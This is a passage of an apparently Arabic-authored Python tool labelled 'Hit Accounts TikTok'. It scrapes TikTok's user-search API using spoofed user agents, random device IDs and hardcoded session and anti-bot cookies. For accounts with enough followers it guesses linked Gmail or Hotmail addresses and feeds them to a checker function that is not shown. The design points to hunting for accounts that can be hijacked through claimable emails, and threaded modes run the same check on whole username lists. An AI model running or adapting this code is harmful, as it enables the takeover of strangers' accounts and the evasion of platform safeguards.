bm_sv=F556D2E15739C190D1B417337724D81E~YAAQVvvOF8ACsxSFAQAAaICxPhJ1QOpVK0jJSh0nuEay3Iz+L/0up1OoP09MVnndgBSzTjunJoYxBBQH4BTuDkQIQY+zt9kedbGoP5/7AUt2jVEq7DfEwQYdr31ZvZiHlhdU2Q5jwNvbZvNzQSokkwHoGbPqes9c4kV0ZGJuEuWc3pLurp0dkRkEBTY0UrcljYpQayw5/w7+4BlpmrMR5UAHElAGf2njGNpz3vRls+WGkTy9l8jRTCEseWkwnA9X~1; ttwid='+ttwid+'; odin_tt=70015f10b12827e4d2b9cce32ead78da9bd1f5af11487a83ba408d86d9a4fb55ec780a14ad91b601d9fe256fcb8160786311c12ef294e6bf285fbbf7eed8dff8080f26ed1bcedbdfca7244743dcbc60e; msToken='+msToken+'; msToken='+msToken+'; s_v_web_id=verify_lc0f2h1w_v9MWasYr_Uw4b_4j2o_8gdZ_QkWrSxI57MTt',
                    'pragma': 'no-cache',
}
                try:
                	response = requests.get('https://www.tiktok.com/api/search/user/full/', params=params, headers=headers,cookies=cookies).json()
                	#print(response)
                except:
                	continue
                for users in response['user_list']:
                    ud = (users['user_info']['uid'])
                    user=(users['user_info']['unique_id'])
                    fol =(users['user_info']['follower_count'])
                    if int(fol)>=1000:
                    	pass
                    else:
                    	continue
                    if '_' in user:
                    	continue
                    email=user+"@gmail.com"
                    chzm(email)     	   
            except:print('Waiting')

def zaidrandom2():
        while True:
            try:
                g=choice(
            [
                  'azertyuiopmlkjhgfdsqwxcvbn', 
                'azertyuiopmlkjhgfdsqwxcvbn',
                'abcdefghijklmnopqrstuvwxyzéèêëàâäôùûüîïç',
 'abcdefghijklmnopqrstuvwxyzéèêëàâäôùûüîïç',
 'ğüişöçñäüğüişöçñäüğüişöçñäü',
 'ğüişöçñäüğüişöçñäüğüişöçñäü',
 'ğüişöçñäüğüişöçñäüğüişöçñäü',
 'ğüişöçñäüğüişöçñäüğüişöçñäü',
 'ğüişöçñäüğüişöçñäüğüişöçñäü',
'abcdefghijklmnopqrstuvwxyzç',
'abcdefghijklmnopqrstuvwxyzç',
                
            ]

        )
                keyword=''.join((choice(g) for i in range(randrange(4,9))))
                idd6= "".join(random.choice('1234567890')for i in range(19))

                #ttwid=requests.get('https://api.douyin.wtf/api/douyin/web/generate_ttwid').json()['data']['ttwid']
                #msToken=requests.get('https://api.douyin.wtf/api/douyin/web/generate_real_msToken').json()['data']['msToken']#                  
                he3 = {"User-Agent": f'com.zhiliaoapp.musically/{keyword} (Linux; U; Android {randrange(7,13)}; ar_IQ_#u-nu-latn; ANY-LX2; Build/{keyword}; Cronet/58.0.{randrange(3,9)}.0)'}
                ttwid=requests.get('https://www.tiktok.com/',headers=he3).cookies.get_dict()['ttwid']
                zaid = requests.get(f'https://www.tiktok.com/api/search/user/full/?aid=1988&app_language=ar&app_name=tiktok_web&battery_info=0.84&browser_language=ar-IQ&browser_name=Mozilla&browser_online=true&browser_platform=Linux%20aarch64&browser_version=5.0%20%28X11%3B%20Linux%20x86_64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F106.0.0.0%20Safari%2F537.36&channel=tiktok_web&cookie_enabled=true&cursor=0&device_id=7136188745632548358&device_platform=web_pc&focus_state=true&from_page=search&history_len=40&is_fullscreen=false&is_page_visible=true&keyword=zaid&os=linux&priority_region=&referer=&region=IQ&screen_height=796&screen_width=360&tz_name=Asia%2FBaghdad&verifyFp=verify_l9zrjkcx_XSZCv5U7_xzys_4UEP_8m1a_TibJS3izVTHL&webcast_language=ar&msToken=qfFKcpRIe_b543Hfa7buaE31PLWDv6-_TQYqevIaTVOPrUNjuwuHR2z0_cEadFELKqD9p6fLuWk8tgAO9lDmVCUX4vqnit3V4rX9zvJfLCbhs9U2apBgYHmKpXPp6DLl2wZy35z0xD6g6TSu_NIh&X-Bogus=DFSzswVLk-tANxW1S02v8OxPBxgg&_signature=_02B4Z6wo00001IuO8aAAAIDBSFHuFzoQUMCLjvUAAEGFfa',headers=he3)
                msToken = zaid.cookies.get_dict()['msToken']
                #print(ttwid)
                headers = {
                    'accept': '*/*',
                    'accept-language': 'en-US,en;q=0.9',
                    'cache-control': 'no-cache',
                    'pragma': 'no-cache',
                    'priority': 'u=1, i',
                    'sec-ch-ua': '"Not)A;Brand";v="99", "Microsoft Edge";v="127", "Chromium";v="127"',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': '"Windows"',
                    'sec-fetch-dest': 'empty',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-site': 'same-origin',
                    'user-agent': he3["User-Agent"],
                }


                params = {
                    'WebIdLastTime': '1715883147',
                    'aid': '1988',
                    'app_language': 'en',
                    'app_name': 'tiktok_web',
                    'browser_language': 'en-US',
                    'browser_name': 'Mozilla',
                    'browser_online': 'true',
                    'browser_platform': 'Win32',
                    'browser_version': he3["User-Agent"],
                    'channel': 'tiktok_web',
                    'cookie_enabled': 'true',
                   'cursor': '230',
                    'data_collection_enabled': 'false',
                    'device_id': idd6,
                    'device_platform': 'web_pc',
                    'focus_state': 'true',
                    'from_page': 'search',
                    'history_len': '5',
                    'is_fullscreen': 'false',
                    'is_page_visible': 'true',
                    'keyword': f'{keyword}',
                    'odinId': '7369661640164000774',
                    'os': 'windows',
                    'priority_region': '',
                    'referer': '',
                   'region': 'PE',
                    'screen_height': '864',
                    'screen_width': '1536',
                    'search_id': '20240801154310BA7846F9CDEDD312B464',
                    'tz_name': 'Asia/Baghdad',
                    'user_is_login': 'false',
                    'web_search_code': '{"tiktok":{"client_params_x":{"search_engine":{"ies_mt_user_live_video_card_use_libra":1,"mt_search_general_user_live_card":1}},"search_server":{}}}',
                    'webcast_language': 'en',
                   'msToken': msToken,
                    'X-Bogus': 'DFSzswVLRekANHWvtvtx-ShPmkfD',
                    '_signature': '_02B4Z6wo00001nO.kIwAAIDCAGLSLe4xtvJzv5QAAPpT70',
                }

                ses=str(uuid4()).replace('-', '')
                cookies = {
                    'cookie': f'passport_csrf_token=446c23e1b656077bd01b1f379ff01c64; passport_csrf_token_default=446c23e1b656077bd01b1f379ff01c64; tiktok_webapp_theme=dark; cookie-consent="ga":true,"af":true,"fbp":true,"lip":true,"bing":true,"ttads":true,"reddit":true,"version":"v8"; _ttp=2HZr0KnJ2pqKwJRyQ8myJ28Lpa8; __tea_cache_tokens_1988="user_unique_id":"7160599742786815489","timestamp":1667850947815,"_type_":"default"; passport_auth_status=c8fe9febc06f8f7a271309fa9e4f80e9,; passport_auth_status_ss=c8fe9febc06f8f7a271309fa9e4f80e9,; tt_csrf_token=CSVYu9wW-NbmqJ_cgNMHwEIItUNZGwDPM-hU; tt_chain_token=K01fXiH8q/IKwxFnx8jzcA==; _abck=951F354EE38142028A7429E8C92DB598~0~YAAQVvvOF6YBsxSFAQAAMc+wPgl24s0qz4P3iMup3WLL4PWyu/iF6+jb4qL2RfvMEKOGTv6dPfAH9AA2Hm+t/Z/Qn1TlkKHzKXk+KmuWj5d1dmCzqXD0BWgAUcMFCLRinQHou0lzh0ImXOw3B98dRIVnofWMwN8L8JxOErAxrQfi2JIEgTjNECxiZFYaqhpfLqyAUXBESaQxfCYfbNwLNwAAZvjpAfc1viGc/I9vlRIeVc2jYPA5/YUVwAytWPIOb2RuvdrXc2bfybwD3ffG0godURyE+r0QSJapjZK7kfVwbPGnVLal0dzAQM6MK2iDC5YhXugMYw9ZXB2CIaYRg4Cqy/t6BabKM9i+ZJgdvwWQQ6ljnk0pa1bKBsAYL79BxNMrQWccpQxQhUm9n09604O82PBKq8E=~-1~-1~-1; bm_sz=304AE404FA2929B0E90042E8314D20CA~YAAQVvvOF6kBsxSFAQAAMc+wPhIfC1eYkaU2YudlghSK8pNrkVcLYapeM/xrzvQbQkT9quFNwKNHsG4xkv6anwuDXn+BSd+gzoBWSdRZJscGEzPghGpbTStjyG61DtaJIqpkgjW7q6BEP37XgXgrWfHRdmoN5zraADDH7wpkIQ3UlBq5rj88cFl1IY4CUg2DSRugvtjKk+vcNV5AUjQ++v859Tv3vYF3Ga6m5lifIf0u50u/dC1xeVz0p4ew+7U21dwrDdNrai63bM7T9ArdMNk1q+2YK55FJU7tdQwtKtdLtnI=~4407620~4277556; ak_bmsc=EE17F7D340A941EB628DF68B5981EA8D~000000000000000000000000000000~YAAQVvvOF/8BsxSFAQAAS/SwPhJbeUd2XpuVnfaiGo9WDUNsMw3AUn4T4r4BtvFH6pwejSxQJ/K4aoQUK/hGU8InWjW8iSyWgKZxkNIl6lgAAvUdX8CiKcyfyQKJYfQcPDyxW6dnF6+VF2/BABsRcYTw9LUX6MjuhvgtLs1uh3AbWeHxdZFDhp/YYwjrPxoOEXgItQjGUSsxRhgRubItrsXwhW20gW9y+I7Eq22TORlAZOn+jyrl2bYH6C4yxD8yld+5OcSAQ3zKJfQLUjNj03BMgtlIyYT74OIh6GwUzgtjpGLUCzpqdeiOFZdfZApTnRoTK9J01CpUY+YxrThJKz4dScjK1V78LSd2CkfUakgFa7TXfZ1fgfPX/RW2nkWTe9SZtvDH3f62qd9b5oNojffOAM0fpnNeX06hNWSNDRRuiHOmv3m49PN2cJhknh753LdNdt81kj8LJ3SEe1y3sfHb0nPwafPExOaSSrXviHwj4+yLWrZw+dXy3Q==; sid_guard=5d52768f6a4a876314ea37244edfd0d0|1671794088|21600|Fri,+23-Dec-2022+17:14:48+GMT; uid_tt={ses[:16]}; uid_tt_ss={ses[:16]}; sid_tt={ses}; sessionid={ses}; sessionid_ss={ses}; sid_ucp_v1=1.0.0-KDM1ZGU2ODk4YzcyNDJkMzUxNWRiMTVlMzc3OTMyZTNlY2JlYWYwYWMKCRCom5adBhizCxADGgZtYWxpdmEiIDVkNTI3NjhmNmE0YTg3NjMxNGVhMzcyNDRlZGZkMGQw; ssid_ucp_v1=1.0.0-KDM1ZGU2ODk4YzcyNDJkMzUxNWRiMTVlMzc3OTMyZTNlY2JlYWYwYWMKCRCom5adBhizCxADGgZtYWxpdmEiIDVkNTI3NjhmNmE0YTg3NjMxNGVhMzcyNDRlZGZkMGQw; bm_sv=F556D2E15739C190D1B417337724D81E~YAAQVvvOF8ACsxSFAQAAaICxPhJ1QOpVK0jJSh0nuEay3Iz+L/0up1OoP09MVnndgBSzTjunJoYxBBQH4BTuDkQIQY+zt9kedbGoP5/7AUt2jVEq7DfEwQYdr31ZvZiHlhdU2Q5jwNvbZvNzQSokkwHoGbPqes9c4kV0ZGJuEuWc3pLurp0dkRkEBTY0UrcljYpQayw5/w7+4BlpmrMR5UAHElAGf2njGNpz3vRls+WGkTy9l8jRTCEseWkwnA9X~1; ttwid='+ttwid+'; odin_tt=70015f10b12827e4d2b9cce32ead78da9bd1f5af11487a83ba408d86d9a4fb55ec780a14ad91b601d9fe256fcb8160786311c12ef294e6bf285fbbf7eed8dff8080f26ed1bcedbdfca7244743dcbc60e; msToken='+msToken+'; msToken='+msToken+'; s_v_web_id=verify_lc0f2h1w_v9MWasYr_Uw4b_4j2o_8gdZ_QkWrSxI57MTt',
                    'pragma': 'no-cache',
}
                try:
                	response = requests.get('https://www.tiktok.com/api/search/user/full/', params=params, headers=headers,cookies=cookies).json()
                	#print(response)
                except:
                	continue
                for users in response['user_list']:
                    ud = (users['user_info']['uid'])
                    user=(users['user_info']['unique_id'])
                    fol =(users['user_info']['follower_count'])
                    if int(fol)>=400:
                    	pass
                    else:
                    	continue
                    email=user+'@hotmail.com'
                    chzm(email)                    	   
            except:print('Waiting')

def zaidrandom3():
        while True:
            try:
                g=choice(
            [
'ğüişöçñäüğüişöçñäüğüişöçñäüqw.ertyuiopasdfghjklzxcvbnm',
'abcdefghijklmnopqrstuvwxyzéèêëàâäôùûüîïç',
                
            ]

        )

                keyword=''.join((choice(g) for i in range(randrange(4,9))))
                idd6= "".join(random.choice('1234567890')for i in range(19))
                #ttwid=requests.get('https://api.douyin.wtf/api/douyin/web/generate_ttwid').json()['data']['ttwid']
                #msToken=requests.get('https://api.douyin.wtf/api/douyin/web/generate_real_msToken').json()['data']['msToken']#                  
                he3 = {"User-Agent": f'com.zhiliaoapp.musically/{keyword} (Linux; U; Android {randrange(7,13)}; ar_IQ_#u-nu-latn; ANY-LX2; Build/{keyword}; Cronet/58.0.{randrange(3,9)}.0)'}
                ttwid=requests.get('https://www.tiktok.com/',headers=he3).cookies.get_dict()['ttwid']
                zaid = requests.get(f'https://www.tiktok.com/api/search/user/full/?aid=1988&app_language=ar&app_name=tiktok_web&battery_info=0.84&browser_language=ar-IQ&browser_name=Mozilla&browser_online=true&browser_platform=Linux%20aarch64&browser_version=5.0%20%28X11%3B%20Linux%20x86_64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F106.0.0.0%20Safari%2F537.36&channel=tiktok_web&cookie_enabled=true&cursor=0&device_id=7136188745632548358&device_platform=web_pc&focus_state=true&from_page=search&history_len=40&is_fullscreen=false&is_page_visible=true&keyword=zaid&os=linux&priority_region=&referer=&region=IQ&screen_height=796&screen_width=360&tz_name=Asia%2FBaghdad&verifyFp=verify_l9zrjkcx_XSZCv5U7_xzys_4UEP_8m1a_TibJS3izVTHL&webcast_language=ar&msToken=qfFKcpRIe_b543Hfa7buaE31PLWDv6-_TQYqevIaTVOPrUNjuwuHR2z0_cEadFELKqD9p6fLuWk8tgAO9lDmVCUX4vqnit3V4rX9zvJfLCbhs9U2apBgYHmKpXPp6DLl2wZy35z0xD6g6TSu_NIh&X-Bogus=DFSzswVLk-tANxW1S02v8OxPBxgg&_signature=_02B4Z6wo00001IuO8aAAAIDBSFHuFzoQUMCLjvUAAEGFfa',headers=he3)
                msToken = zaid.cookies.get_dict()['msToken']
                #print(ttwid)
                headers = {
                    'accept': '*/*',
                    'accept-language': 'en-US,en;q=0.9',
                    'cache-control': 'no-cache',
                    'pragma': 'no-cache',
                    'priority': 'u=1, i',
                    'sec-ch-ua': '"Not)A;Brand";v="99", "Microsoft Edge";v="127", "Chromium";v="127"',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': '"Windows"',
                    'sec-fetch-dest': 'empty',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-site': 'same-origin',
                    'user-agent': he3["User-Agent"],
                }


                params = {
                    'WebIdLastTime': '1715883147',
                    'aid': '1988',
                    'app_language': 'en',
                    'app_name': 'tiktok_web',
                    'browser_language': 'en-US',
                    'browser_name': 'Mozilla',
                    'browser_online': 'true',
                    'browser_platform': 'Win32',
                    'browser_version': he3["User-Agent"],
                    'channel': 'tiktok_web',
                    'cookie_enabled': 'true',
                   'cursor': '220',
                    'data_collection_enabled': 'false',
                    'device_id': idd6,
                    'device_platform': 'web_pc',
                    'focus_state': 'true',
                    'from_page': 'search',
                    'history_len': '5',
                    'is_fullscreen': 'false',
                    'is_page_visible': 'true',
                    'keyword': f'{keyword}',
                    'odinId': '7369661640164000774',
                    'os': 'windows',
                    'priority_region': '',
                    'referer': '',
                   'region': 'PE',
                    'screen_height': '864',
                    'screen_width': '1536',
                    'search_id': '20240801154310BA7846F9CDEDD312B464',
                    'tz_name': 'Asia/Baghdad',
                    'user_is_login': 'false',
                    'web_search_code': '{"tiktok":{"client_params_x":{"search_engine":{"ies_mt_user_live_video_card_use_libra":1,"mt_search_general_user_live_card":1}},"search_server":{}}}',
                    'webcast_language': 'en',
                   'msToken': msToken,
                    'X-Bogus': 'DFSzswVLRekANHWvtvtx-ShPmkfD',
                    '_signature': '_02B4Z6wo00001nO.kIwAAIDCAGLSLe4xtvJzv5QAAPpT70',
                }

                ses=str(uuid4()).replace('-', '')
                cookies = {
                    'cookie': f'passport_csrf_token=446c23e1b656077bd01b1f379ff01c64; passport_csrf_token_default=446c23e1b656077bd01b1f379ff01c64; tiktok_webapp_theme=dark; cookie-consent="ga":true,"af":true,"fbp":true,"lip":true,"bing":true,"ttads":true,"reddit":true,"version":"v8"; _ttp=2HZr0KnJ2pqKwJRyQ8myJ28Lpa8; __tea_cache_tokens_1988="user_unique_id":"7160599742786815489","timestamp":1667850947815,"_type_":"default"; passport_auth_status=c8fe9febc06f8f7a271309fa9e4f80e9,; passport_auth_status_ss=c8fe9febc06f8f7a271309fa9e4f80e9,; tt_csrf_token=CSVYu9wW-NbmqJ_cgNMHwEIItUNZGwDPM-hU; tt_chain_token=K01fXiH8q/IKwxFnx8jzcA==; _abck=951F354EE38142028A7429E8C92DB598~0~YAAQVvvOF6YBsxSFAQAAMc+wPgl24s0qz4P3iMup3WLL4PWyu/iF6+jb4qL2RfvMEKOGTv6dPfAH9AA2Hm+t/Z/Qn1TlkKHzKXk+KmuWj5d1dmCzqXD0BWgAUcMFCLRinQHou0lzh0ImXOw3B98dRIVnofWMwN8L8JxOErAxrQfi2JIEgTjNECxiZFYaqhpfLqyAUXBESaQxfCYfbNwLNwAAZvjpAfc1viGc/I9vlRIeVc2jYPA5/YUVwAytWPIOb2RuvdrXc2bfybwD3ffG0godURyE+r0QSJapjZK7kfVwbPGnVLal0dzAQM6MK2iDC5YhXugMYw9ZXB2CIaYRg4Cqy/t6BabKM9i+ZJgdvwWQQ6ljnk0pa1bKBsAYL79BxNMrQWccpQxQhUm9n09604O82PBKq8E=~-1~-1~-1; bm_sz=304AE404FA2929B0E90042E8314D20CA~YAAQVvvOF6kBsxSFAQAAMc+wPhIfC1eYkaU2YudlghSK8pNrkVcLYapeM/xrzvQbQkT9quFNwKNHsG4xkv6anwuDXn+BSd+gzoBWSdRZJscGEzPghGpbTStjyG61DtaJIqpkgjW7q6BEP37XgXgrWfHRdmoN5zraADDH7wpkIQ3UlBq5rj88cFl1IY4CUg2DSRugvtjKk+vcNV5AUjQ++v859Tv3vYF3Ga6m5lifIf0u50u/dC1xeVz0p4ew+7U21dwrDdNrai63bM7T9ArdMNk1q+2YK55FJU7tdQwtKtdLtnI=~4407620~4277556; ak_bmsc=EE17F7D340A941EB628DF68B5981EA8D~000000000000000000000000000000~YAAQVvvOF/8BsxSFAQAAS/SwPhJbeUd2XpuVnfaiGo9WDUNsMw3AUn4T4r4BtvFH6pwejSxQJ/K4aoQUK/hGU8InWjW8iSyWgKZxkNIl6lgAAvUdX8CiKcyfyQKJYfQcPDyxW6dnF6+VF2/BABsRcYTw9LUX6MjuhvgtLs1uh3AbWeHxdZFDhp/YYwjrPxoOEXgItQjGUSsxRhgRubItrsXwhW20gW9y+I7Eq22TORlAZOn+jyrl2bYH6C4yxD8yld+5OcSAQ3zKJfQLUjNj03BMgtlIyYT74OIh6GwUzgtjpGLUCzpqdeiOFZdfZApTnRoTK9J01CpUY+YxrThJKz4dScjK1V78LSd2CkfUakgFa7TXfZ1fgfPX/RW2nkWTe9SZtvDH3f62qd9b5oNojffOAM0fpnNeX06hNWSNDRRuiHOmv3m49PN2cJhknh753LdNdt81kj8LJ3SEe1y3sfHb0nPwafPExOaSSrXviHwj4+yLWrZw+dXy3Q==; sid_guard=5d52768f6a4a876314ea37244edfd0d0|1671794088|21600|Fri,+23-Dec-2022+17:14:48+GMT; uid_tt={ses[:16]}; uid_tt_ss={ses[:16]}; sid_tt={ses}; sessionid={ses}; sessionid_ss={ses}; sid_ucp_v1=1.0.0-KDM1ZGU2ODk4YzcyNDJkMzUxNWRiMTVlMzc3OTMyZTNlY2JlYWYwYWMKCRCom5adBhizCxADGgZtYWxpdmEiIDVkNTI3NjhmNmE0YTg3NjMxNGVhMzcyNDRlZGZkMGQw; ssid_ucp_v1=1.0.0-KDM1ZGU2ODk4YzcyNDJkMzUxNWRiMTVlMzc3OTMyZTNlY2JlYWYwYWMKCRCom5adBhizCxADGgZtYWxpdmEiIDVkNTI3NjhmNmE0YTg3NjMxNGVhMzcyNDRlZGZkMGQw; bm_sv=F556D2E15739C190D1B417337724D81E~YAAQVvvOF8ACsxSFAQAAaICxPhJ1QOpVK0jJSh0nuEay3Iz+L/0up1OoP09MVnndgBSzTjunJoYxBBQH4BTuDkQIQY+zt9kedbGoP5/7AUt2jVEq7DfEwQYdr31ZvZiHlhdU2Q5jwNvbZvNzQSokkwHoGbPqes9c4kV0ZGJuEuWc3pLurp0dkRkEBTY0UrcljYpQayw5/w7+4BlpmrMR5UAHElAGf2njGNpz3vRls+WGkTy9l8jRTCEseWkwnA9X~1; ttwid='+ttwid+'; odin_tt=70015f10b12827e4d2b9cce32ead78da9bd1f5af11487a83ba408d86d9a4fb55ec780a14ad91b601d9fe256fcb8160786311c12ef294e6bf285fbbf7eed8dff8080f26ed1bcedbdfca7244743dcbc60e; msToken='+msToken+'; msToken='+msToken+'; s_v_web_id=verify_lc0f2h1w_v9MWasYr_Uw4b_4j2o_8gdZ_QkWrSxI57MTt',
                    'pragma': 'no-cache',
}
                try:
                	response = requests.get('https://www.tiktok.com/api/search/user/full/', params=params, headers=headers,cookies=cookies).json()
                	#print(response)
                except:
                	continue
                for users in response['user_list']:
                    ud = (users['user_info']['uid'])
                    user=(users['user_info']['unique_id'])
                    fol =(users['user_info']['follower_count'])
                    if int(fol)>=400:
                    	pass
                    else:
                    	continue
                    if '_' in user:
                    	continue
                    else:
                    	pass
                    email=user+'@gmail.com'
                    chzm(email)                    	   
            except:print('Waiting')

from concurrent.futures import ThreadPoolExecutor
def admin_gmail(name):
	try:
		file = open(name,'r').read().splitlines()
		addd = len(open(name).read().splitlines())
	except:
		os.system('clear')
		print(S+"السته غير موجوده  ! "	)
	with ThreadPoolExecutor(max_workers=5) as executor:
	    futures = [executor.submit(chzm, user+"@gmail.com") for user in file]
	    for future in futures:
	        future.result()
def admin_hotmail(name):
	try:
		file = open(name,'r').read().splitlines()
		addd = len(open(name).read().splitlines())
	except:
		os.system('clear')
		print(S+"السته غير موجوده  ! "	)
	with ThreadPoolExecutor(max_workers=5) as executor:
	    futures = [executor.submit(chzm, user+"@hotmail.com") for user in file]
	    for future in futures:
	        future.result()
                                                  
Z = '\033[1;31m';X = '\033[1;33m';F = '\033[2;32m' ;C = "\033[1;97m";B = '\033[2;36m';Y = '\033[1;34m';C = "\033[1;97m";E = '\033[1;31m';B = '\033[2;36m';G = '\033[1;32m';S = '\033[1;33m'            
def znm():
	zom=f"""
{S}{B}{B}Tools {E}[{S}P_W_7{E}] {B}Hit Accounts TikTok 
{B}═════════════════════════════
{S}1 - {F} Check Followers {S}(اليتابعهم)
{S}2 - {F} Check Random {S}(مصفر)
{S}3 - {F} Check Random2 {S}(عالي فقط)
{S}4 - {F} Check Random3 {Z} - Speed 🚀  
{S}5 - {F} Check Random {S}{Z}({C}hotmail{Z})
{S}6 - {F} Check List {S}{Z}({C}Gmail{Z})
{S}7 - {F} Check List {S}{Z}({C}Hotmail{Z})
{B}═════════════════════════════
"""
	print(zom)
	try:
		i = int(input(f'{S}∆ - Write Numper Next : '))
		print('\n')
		print(f'{B}═════════════════════════════')
		if i ==1:
			os.system('clear')
			userzaid()
		elif i ==2:
			    import threading
			    threads = []
			    for i in range(4):
			     t = threading.Thread(target=rrandom)
			     threads.append(t)
			     t.start()
			    for t in threads:
			    	t.join()			    	
		elif i ==3:
			    import threading
			    threads = []
			    for i in range(4):
			     t = threading.Thread(target=zaidrandom)
			     threads.append(t)
			     t.start()
			    for t in threads:
			    	t.join()
		elif i ==4:
			    import threading
			    threads = []
			    for i in range(4):
			     t = threading.Thread(target=zaidrandom3)
			     threads.append(t)
			     t.start()
			    for t in threads:
			    	t.join()
			    				    	
		elif i ==5:
			    import threading
			    threads = []
			    for i in range(4):
			     t = threading.Thread(target=zaidrandom2)
			     threads.append(t)
			     t.start()
			    for t in threads:
			    	t.join()
		elif i ==6:
			name=input(f'{S}∆ - Write Name ListUser : ')
			admin_gmail(name)
		elif i ==7:
			name=input(f'{S}∆ - Write Name ListUser : ')
			admin_hotmail(name)
		else:
			os.system('clear')
			print(f'{S} Error Input :) ')
	except:
		os.system('clear')
		print(f'{S} Error Input :) ')

znm()